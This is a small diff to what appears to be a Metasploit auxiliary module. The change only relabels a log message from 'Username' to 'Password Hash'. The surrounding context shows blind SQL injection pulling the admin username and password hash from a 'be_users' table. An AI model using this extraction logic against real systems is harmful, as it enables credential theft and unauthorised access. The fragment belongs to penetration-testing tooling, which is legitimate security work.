@@ -67,7 +67,7 @@ class MetasploitModule < Msf::Auxiliary
     username = blind('username','be_users', 'uid=1', ascii_charset, digit_charset)
     print_good("Username: #{username}")
     password = blind('password','be_users', 'uid=1', full_charset, digit_charset)
-    print_good("Username: #{password}")
+    print_good("Password Hash: #{password}")
     return [username, password]
   end
 
